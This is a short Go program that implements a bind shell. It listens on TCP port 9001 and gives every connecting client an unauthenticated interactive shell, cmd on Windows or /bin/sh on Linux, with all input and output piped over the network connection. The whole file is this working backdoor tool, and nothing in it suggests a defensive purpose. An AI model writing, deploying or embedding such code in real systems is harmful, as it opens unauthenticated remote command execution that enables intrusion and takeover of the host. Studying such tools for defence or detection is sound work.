package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"sync"
)

func shell(c net.Conn, wg *sync.WaitGroup) {
	fmt.Println("Creating Shell")

	defer wg.Done()

	getShell()(c)
}

func getShell() func(net.Conn) {
	if runtime.GOOS == "windows" {
		return _shellWindows
	}
	return _shellLinux
}

func _shellWindows(conn net.Conn) {
	c := exec.Command("cmd")
	c.Stdin = conn
	c.Stdout = conn
	c.Stderr = conn
	c.Run()
}

func _shellLinux(conn net.Conn) {
	c := exec.Command("/bin/sh")
	c.Stdin = conn
	c.Stdout = conn
	c.Stderr = conn
	c.Run()
}

func bindShell(port string, wg *sync.WaitGroup) {
	fmt.Println("Creating Bind Shell")

	// Handle waitgroup
	defer wg.Done()

	c, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Println("Unable to bind listener to port:", port)
		return
	}

	for {
		conn, err := c.Accept()
		if err != nil {
			fmt.Println("Error accepting connection... ", err.Error())
			return
		}

		wg.Add(1)
		go shell(conn, wg)
	}
}

func main() {
	var wg sync.WaitGroup

	Port := "9001"

	wg.Add(1)
	go bindShell(Port, &wg)

	wg.Wait()
}
